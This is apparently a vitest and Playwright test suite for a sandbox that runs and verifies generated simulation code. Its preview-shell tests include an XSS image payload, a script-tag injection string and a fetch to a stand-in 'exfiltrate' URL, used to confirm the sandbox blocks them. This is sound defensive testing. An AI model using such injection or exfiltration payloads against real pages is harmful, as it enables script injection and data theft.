import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { existsSync } from 'node:fs';
import { chromium, type Browser, type Frame, type Page } from 'playwright';
import { buildSimulationDocument, type SimulationHostCommand, type SimulationSnapshot } from '../shared/simulation-runtime';
import type { SimulationArtifact, SimulationScenario, SimulationSpec } from '../shared/simulation-types';
import { smokeSimulation, verifySimulation } from '../server/simulation-browser';

type HostWindow = Window & { simulationHost: { ready: Promise<SimulationSnapshot>; command(command: SimulationHostCommand): Promise<SimulationSnapshot> } };
const baseSpec: SimulationSpec = {
  goal: 'Explore a configurable process', title: 'A generated process', summary: 'An isolated generated model', assumptions: [],
  controls: [{ id: 'rate', label: 'Rate', type: 'range', min: 0, max: 10, step: 1, initial: 3 }],
  observables: [{ id: 'level', label: 'Level', type: 'number' }], requirements: [{ id: 'changes', text: 'The level changes at the chosen rate' }],
};
const source = `function createSimulation() {
  let level = 0, rate = 99;
  return {
    reset() { level = 0; rate = 99; },
    input(id, value) { if (id === 'rate') rate = value; },
    step(dt) { level += rate * dt; },
    snapshot() { return {level}; },
    draw(ctx, width, height) { ctx.fillStyle = '#1a8a60'; ctx.fillRect(20, 20, Math.max(10, level * 10), height / 2); }
  };
}`;
const artifact = (replacement = source): SimulationArtifact => ({ spec: structuredClone(baseSpec), candidate: { id: 'candidate', source: replacement, rationale: 'Generated behavior' } });
const scenario: SimulationScenario = {
  id: 'change', name: 'Changes under control', steps: [
    { type: 'advance', durationMs: 1000 },
    { type: 'assert', id: 'default', requirementIds: ['changes'], observable: 'level', operator: 'approx', value: 3, tolerance: 0.0001 },
    { type: 'input', controlId: 'rate', value: 8 },
    { type: 'advance', durationMs: 500 },
    { type: 'assert', id: 'adjusted', requirementIds: ['changes'], observable: 'level', operator: 'approx', value: 7, tolerance: 0.0001 },
    { type: 'reset' },
    { type: 'advance', durationMs: 1000 },
    { type: 'assert', id: 'reset', requirementIds: ['changes'], observable: 'level', operator: 'approx', value: 3, tolerance: 0.0001 },
  ],
};

const expectCheck = (id: string, observable: string, value: number) => ({ type: 'assert' as const, id, requirementIds: ['behavior'], observable, operator: 'approx' as const, value, tolerance: 0.0001 });

// These deliberately unrelated programs are test fixtures, not runtime templates.
const diversePrograms = [
  {
    title: 'Chemical reaction',
    controls: [{ id: 'concentration', label: 'Initial concentration', type: 'range' as const, min: 1, max: 20, initial: 10 }],
    observables: [{ id: 'reactant', label: 'Reactant remaining', type: 'number' as const }],
    source: `function createSimulation(){let reactant=0;return {reset(){reactant=0},input(id,v){reactant=v},step(dt){reactant*=Math.exp(-dt)},snapshot(){return {reactant}},draw(c,w,h){c.fillStyle='purple';c.fillRect(10,10,reactant*10,40)}}}`,
    steps: [{ type: 'advance' as const, durationMs: 1000 }, expectCheck('decay', 'reactant', 10 / Math.E)],
  },
  {
    title: 'Packet queue',
    controls: [{ id: 'enqueue', label: 'Send packet', type: 'button' as const, initial: false }],
    observables: [{ id: 'waiting', label: 'Waiting', type: 'number' as const }],
    source: `function createSimulation(){let waiting=0,credit=0;return {reset(){waiting=0;credit=0},input(id,v){if(v)waiting++},step(dt){credit+=dt;if(credit>=0.5&&waiting){waiting--;credit=0}},snapshot(){return {waiting}},draw(c,w,h){c.fillStyle='blue';c.fillRect(10,10,20+waiting*20,40)}}}`,
    steps: [{ type: 'input' as const, controlId: 'enqueue', value: true }, { type: 'input' as const, controlId: 'enqueue', value: false }, expectCheck('arrived', 'waiting', 1), { type: 'advance' as const, durationMs: 1000 }, expectCheck('served', 'waiting', 0)],
  },
  {
    title: 'Planetary orbit',
    controls: [{ id: 'angularSpeed', label: 'Angular speed', type: 'range' as const, min: 0, max: 5, initial: 2 }],
    observables: [{ id: 'angle', label: 'Angle', type: 'number' as const }],
    source: `function createSimulation(){let angle=0,speed=0;return {reset(){angle=0},input(id,v){speed=v},step(dt){angle+=speed*dt},snapshot(){return {angle}},draw(c,w,h){c.fillStyle='orange';c.beginPath();c.arc(w/2+80*Math.cos(angle),h/2+80*Math.sin(angle),12,0,Math.PI*2);c.fill()}}}`,
    steps: [{ type: 'advance' as const, durationMs: 750 }, expectCheck('orbited', 'angle', 1.5)],
  },
];

describe('Generic generated simulation verification', () => {
  it('runs source-defined behavior and reapplies frozen control defaults after reset', async () => {
    const verification = await verifySimulation(artifact(), [scenario]);
    expect(verification.error).toBeUndefined();
    expect(verification.passed, JSON.stringify(verification)).toBe(true);
    expect(verification.results[0].checks).toHaveLength(3);
  });

  it('accepts finite flat snapshots with a null prototype', async () => {
    const candidate = artifact(source.replace('return {level};', 'return Object.assign(Object.create(null), {level});'));
    const verification = await verifySimulation(candidate, [scenario]);
    expect(verification.passed, JSON.stringify(verification)).toBe(true);
    expect(verification.results[0].checks[1].actual).toBeCloseTo(7);
  });

  it('reaches exact command boundaries for timed events across split advances and reset', async () => {
    const generated = artifact(`function createSimulation(){
      let time=0, events=0, nextEvent=7, largestStep=0;
      return {
        reset(){time=0;events=0;nextEvent=7;largestStep=0},input(){},
        step(dt){const endTime=time+dt;largestStep=Math.max(largestStep,dt);while(nextEvent<=endTime){events++;nextEvent+=7}time=endTime},
        snapshot(){return {time,events,largestStep}},draw(c){c.fillRect(1,1,5,5)}
      };
    }`);
    generated.spec.controls = [];
    generated.spec.observables = [
      { id: 'time', label: 'Elapsed time', type: 'number' },
      { id: 'events', label: 'Timed events', type: 'number' },
      { id: 'largestStep', label: 'Largest integration step', type: 'number' },
    ];
    const partitions = [[7000], [2000, 1000, 4000], [1234, 5766], [0.5, 999.5, 6000]];
    const scenarios: SimulationScenario[] = partitions.map((parts, index) => ({
      id: `clock-${index}`, name: `Exact event boundary with advances ${parts.join(', ')}`,
      steps: [
        ...parts.map(durationMs => ({ type: 'advance' as const, durationMs })),
        { type: 'assert', id: 'clock', requirementIds: ['changes'], observable: 'time', operator: 'eq', value: 7 },
        { type: 'assert', id: 'event', requirementIds: ['changes'], observable: 'events', operator: 'eq', value: 1 },
        { type: 'assert', id: 'step', requirementIds: ['changes'], observable: 'largestStep', operator: 'lte', value: 1 / 60 + 1e-12 },
        { type: 'reset' }, { type: 'advance', durationMs: 7000 },
        { type: 'assert', id: 'reset-clock', requirementIds: ['changes'], observable: 'time', operator: 'eq', value: 7 },
        { type: 'assert', id: 'reset-event', requirementIds: ['changes'], observable: 'events', operator: 'eq', value: 1 },
      ],
    }));
    const verification = await verifySimulation(generated, scenarios);
    expect(verification.passed, JSON.stringify(verification)).toBe(true);
  });

  it.each(diversePrograms)('executes unrelated generated models: $title', async ({ title, controls, observables, source, steps }) => {
    const generated: SimulationArtifact = {
      spec: { goal: title, title, summary: title, assumptions: [], controls, observables, requirements: [{ id: 'behavior', text: 'The generated model responds to its inputs over time' }] },
      candidate: { id: 'independent', source, rationale: title },
    };
    const verification = await verifySimulation(generated, [{ id: 'behavior', name: title, steps }]);
    expect(verification.passed, JSON.stringify(verification)).toBe(true);
  });

  it('fails independent expectations when candidate source implements the wrong behavior', async () => {
    const verification = await verifySimulation(artifact(source.replace('rate * dt', 'rate * dt * 2')), [scenario]);
    expect(verification.passed).toBe(false);
    expect(verification.results[0].completed).toBe(true);
    expect(verification.results[0].checks.every(check => !check.passed)).toBe(true);
    expect(verification.results[0].checks[0].actual).toBeCloseTo(6);
  });

  it.each([
    ['missing', 'return {level};', 'return {};', 'Missing observable: level'],
    ['wrong type', 'return {level};', "return {level:'incorrect'};", 'must be number'],
    ['nonfinite', 'return {level};', 'return {level:NaN};', 'finite JSON'],
    ['draw exception', "ctx.fillStyle = '#1a8a60';", "throw new Error('drawing failed');", 'drawing failed'],
    ['blank drawing', 'ctx.fillRect(20, 20, Math.max(10, level * 10), height / 2);', '', 'empty canvas'],
  ])('records every expected check after a %s runtime failure', async (_name, original, replacement, expected) => {
    const verification = await verifySimulation(artifact(source.replace(original, replacement)), [scenario]);
    expect(verification.passed).toBe(false);
    expect(verification.results[0].completed).toBe(false);
    expect(verification.results[0].error).toContain(expected);
    expect(verification.results[0].checks).toHaveLength(3);
    expect(verification.results[0].checks.every(check => !check.passed)).toBe(true);
  });

  it('validates observables even when a scenario does not assert them', async () => {
    const generated = artifact();
    generated.spec.observables.push({ id: 'unasserted', label: 'Unasserted output', type: 'boolean' });
    const verification = await verifySimulation(generated, [scenario]);
    expect(verification.passed).toBe(false);
    expect(verification.results[0].error).toContain('Missing observable: unasserted');
  });

  it.each([
    ['Math.random()', 'fixed-seed generator'],
    ['Date.now()', 'Wall-clock time'],
    ['performance.now()', 'Wall-clock time'],
  ])('turns nondeterministic %s into actionable repair evidence', async (expression, diagnostic) => {
    const verification = await verifySimulation(artifact(source.replace('level += rate * dt;', `level += ${expression};`)), [scenario]);
    expect(verification.passed).toBe(false);
    expect(verification.results[0].error).toContain(diagnostic);
  });

  it('terminates an infinite generated loop at the Worker watchdog', async () => {
    const started = performance.now();
    const verification = await verifySimulation(artifact(source.replace('level += rate * dt;', 'while(true) {}')), [scenario]);
    expect(verification.passed).toBe(false);
    expect(verification.results[0].error).toContain('3 second execution limit');
    expect(performance.now() - started).toBeLessThan(10000);
  });

  it('honors a shorter overall deadline and abort signal while generated code is hung', async () => {
    const generated = artifact(source.replace('level += rate * dt;', 'while(true) {}'));
    const timeout = await verifySimulation(generated, [scenario], { timeoutMs: 700 });
    expect(timeout.passed).toBe(false);
    expect(timeout.error).toContain('wall-clock timeout');
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 700);
    try {
      const cancelled = await verifySimulation(generated, [scenario], { signal: controller.signal });
      expect(cancelled.error).toBe('Simulation cancelled');
    } finally { clearTimeout(timer); }
  });

  it('rejects empty verification suites', async () => {
    expect((await verifySimulation(artifact(), [])).passed).toBe(false);
    expect((await verifySimulation(artifact(), [{ id: 'empty', name: 'Empty', steps: [] }])).passed).toBe(false);
  });
});

describe('Runtime-only draft checks', () => {
  it('runs a custom model without claiming behavioral assertion evidence', async () => {
    // Deliberately wrong against the acceptance suite, but a valid runnable draft.
    const result = await smokeSimulation(artifact(source.replace('rate * dt', 'rate * dt * 2')));
    expect(result).toEqual({ passed: true });
  });

  it('rejects a model that initializes but fails during positive advancement', async () => {
    const result = await smokeSimulation(artifact(source.replace('level += rate * dt;', "throw new Error('Draft step failed');")));
    expect(result.passed).toBe(false);
    expect(result.error).toContain('Draft step failed');
  });

  it('actually resets the advanced model', async () => {
    const result = await smokeSimulation(artifact(source.replace('reset() { level = 0;', "reset() { if (level > 0) throw new Error('Draft reset failed'); level = 0;")));
    expect(result.passed).toBe(false);
    expect(result.error).toContain('Draft reset failed');
  });

  it('cancels a hung draft without producing verification evidence', async () => {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 700);
    try {
      const result = await smokeSimulation(artifact(source.replace('level += rate * dt;', 'while(true) {}')), { signal: controller.signal });
      expect(result).toEqual({ passed: false, error: 'Simulation cancelled' });
    } finally { clearTimeout(timer); }
  });
});

describe('Trusted preview shell', () => {
  let browser: Browser;
  beforeAll(async () => {
    const executable = chromium.executablePath();
    const macChrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
    browser = await chromium.launch({ headless: true, executablePath: process.env.CHROME_EXECUTABLE_PATH ?? (existsSync(executable) ? executable : existsSync(macChrome) ? macChrome : undefined) });
  });
  afterAll(async () => { await browser?.close(); });
  const load = async (generated: SimulationArtifact, standalone = false): Promise<{ page: Page; frame: Frame }> => {
    const page = await browser.newPage();
    await page.setContent('<iframe id="simulation" sandbox="allow-scripts" style="width:960px;height:540px"></iframe>');
    await page.locator('#simulation').evaluate((element, html) => { (element as HTMLIFrameElement).srcdoc = html; }, buildSimulationDocument(generated, { standalone }));
    const frame = (await (await page.locator('#simulation').elementHandle())!.contentFrame())!;
    await frame.waitForFunction(() => Boolean((window as unknown as HostWindow).simulationHost));
    await frame.evaluate(() => (window as unknown as HostWindow).simulationHost.ready);
    return { page, frame };
  };
  const command = (frame: Frame, requested: SimulationHostCommand) => frame.evaluate(command => (window as unknown as HostWindow).simulationHost.command(command), requested);
  const waitForSnapshot = (frame: Frame, assertion: (snapshot: SimulationSnapshot) => void) => vi.waitFor(async () => {
    assertion(await command(frame, { type: 'snapshot' }));
  }, { timeout: 5000, interval: 25 });

  it('produces deterministic HTML and keeps generated markup out of the trusted document', async () => {
    const generated = artifact(source + '\n// </script><script>window.compromised = true</script>');
    generated.spec.title = '<img src=x onerror="window.compromised=true">';
    expect(buildSimulationDocument(generated)).toBe(buildSimulationDocument(generated));
    const { page, frame } = await load(generated, true);
    try {
      expect(await frame.locator('img').count()).toBe(0);
      expect(await frame.locator('strong').textContent()).toBe(generated.spec.title);
      expect(await frame.evaluate(() => 'compromised' in window)).toBe(false);
      expect((await command(frame, { type: 'advance', durationMs: 1000 })).state.level).toBeCloseTo(3);
    } finally { await page.close(); }
  });

  it('keeps parent DOM inaccessible and blocks generated network calls', async () => {
    const generated = artifact(`function createSimulation(){
      let level=0;
      return {reset(){
        if (typeof document !== 'undefined' || typeof window !== 'undefined') throw new Error('DOM escaped');
        try { fetch('https://example.com/exfiltrate'); } catch { level=1; }
      },input(){},step(){},snapshot(){return {level}},draw(c){c.fillRect(1,1,5,5)}};
    }`);
    const { page, frame } = await load(generated);
    try {
      expect((await command(frame, { type: 'snapshot' })).state.level).toBe(1);
      expect(await frame.evaluate(() => { try { return parent.document.body.tagName; } catch { return 'blocked'; } })).toBe('blocked');
      expect(await page.locator('#simulation').getAttribute('sandbox')).toBe('allow-scripts');
    } finally { await page.close(); }
  });

  it('supports keyboard controls while focus is inside the iframe and releases on blur/pause', async () => {
    const generated = artifact(`function createSimulation(){let level=0,held=false;return {reset(){level=0;held=false},input(id,v){held=v},step(dt){if(held)level+=dt},snapshot(){return {level}},draw(c){c.fillRect(1,1,5,5)}}}`);
    generated.spec.controls = [{ id: 'move', label: 'Move', type: 'key', initial: false, key: 'w' }];
    const { page, frame } = await load(generated);
    try {
      await command(frame, { type: 'play' });
      await frame.locator('canvas').click();
      await page.keyboard.down('w');
      await waitForSnapshot(frame, result => expect(result.inputs?.move).toBe(true));
      await frame.evaluate(() => window.dispatchEvent(new Event('blur')));
      expect((await command(frame, { type: 'snapshot' })).inputs?.move).toBe(false);
      await page.keyboard.up('w');
      await page.keyboard.down('w');
      await waitForSnapshot(frame, result => expect(result.inputs?.move).toBe(true));
      const paused = await command(frame, { type: 'pause' });
      expect(paused.running).toBe(false);
      expect(paused.inputs?.move).toBe(false);
      await page.keyboard.up('w');
    } finally { await page.close(); }
  });

  it('makes exported standalone HTML interactive with trusted controls and reset', async () => {
    const { page, frame } = await load(artifact(), true);
    try {
      expect(await frame.getByRole('button', { name: 'Play', exact: true }).count()).toBe(1);
      await frame.locator('input[type=range]').fill('5');
      await frame.locator('input[type=range]').dispatchEvent('input');
      expect((await command(frame, { type: 'advance', durationMs: 1000 })).state.level).toBeCloseTo(5);
      await frame.getByRole('button', { name: 'Reset', exact: true }).click();
      await waitForSnapshot(frame, result => expect(result.state.level).toBe(0));
      expect(await frame.locator('input[type=range]').inputValue()).toBe('3');
    } finally { await page.close(); }
  });

  it('preserves fractional standalone ranges when no step is specified', async () => {
    const generated = artifact();
    generated.spec.controls = [{ id: 'rate', label: 'Rate', type: 'range', min: 0.1, max: 0.9, initial: 0.2 }];
    const { page, frame } = await load(generated, true);
    try {
      const slider = frame.locator('input[type=range]');
      expect(await slider.inputValue()).toBe('0.2');
      expect(await slider.getAttribute('step')).toBe('any');
      await slider.fill('0.35');
      await slider.dispatchEvent('input');
      expect((await command(frame, { type: 'advance', durationMs: 1000 })).state.level).toBeCloseTo(0.35);
      await frame.getByRole('button', { name: 'Reset', exact: true }).click();
      await frame.waitForFunction(() => (document.querySelector('input[type=range]') as HTMLInputElement).value === '0.2');
    } finally { await page.close(); }
  });

  it('exposes standalone button and key controls by their visible accessible names', async () => {
    const generated = artifact(`function createSimulation(){let level=0;return {reset(){level=0},input(id,v){if(id==='refill'&&v)level=10},step(){},snapshot(){return {level}},draw(c){c.fillRect(1,1,5,5)}}}`);
    generated.spec.controls = [
      { id: 'refill', label: 'Refill tank', type: 'button', initial: false },
      { id: 'drain', label: 'Drain', type: 'key', key: 'd', initial: false },
    ];
    const { page, frame } = await load(generated, true);
    try {
      const refill = frame.getByRole('button', { name: 'Refill tank', exact: true });
      const drain = frame.getByRole('button', { name: 'Drain (d)', exact: true });
      expect(await refill.count()).toBe(1);
      expect(await drain.count()).toBe(1);
      await refill.click();
      await waitForSnapshot(frame, result => expect(result.state.level).toBe(10));
      await drain.focus();
      await page.keyboard.down('Enter');
      await waitForSnapshot(frame, result => expect(result.inputs?.drain).toBe(true));
      await page.keyboard.up('Enter');
      await waitForSnapshot(frame, result => expect(result.inputs?.drain).toBe(false));
    } finally { await page.close(); }
  });

  it('gives standalone mapped Space precedence and releases button keyboard input on blur', async () => {
    const generated = artifact(`function createSimulation(){let level=0;return {reset(){level=0},input(id,v){if(id==='first')level=v?1:0},step(){},snapshot(){return {level}},draw(c){c.fillRect(1,1,5,5)}}}`);
    generated.spec.controls = [
      { id: 'first', label: 'First', type: 'key', key: 'a', initial: false },
      { id: 'second', label: 'Second', type: 'key', key: 'Space', initial: false },
    ];
    const { page, frame } = await load(generated, true);
    try {
      const first = frame.locator('button').filter({ hasText: 'First (a)' });
      await first.focus();
      await page.keyboard.down('Space');
      await waitForSnapshot(frame, result => expect(result.inputs?.second).toBe(true));
      expect((await command(frame, { type: 'snapshot' })).inputs?.first).toBe(false);
      await page.keyboard.up('Space');
      await waitForSnapshot(frame, result => expect(result.inputs?.second).toBe(false));
      await first.focus();
      await page.keyboard.down('Enter');
      await waitForSnapshot(frame, result => expect(result.inputs?.first).toBe(true));
      await frame.getByRole('button', { name: 'Play', exact: true }).focus();
      await page.keyboard.up('Enter');
      await waitForSnapshot(frame, result => expect(result.inputs?.first).toBe(false));
      expect((await command(frame, { type: 'snapshot' })).inputs).toEqual({ first: false, second: false });
    } finally { await page.close(); }
  });
});
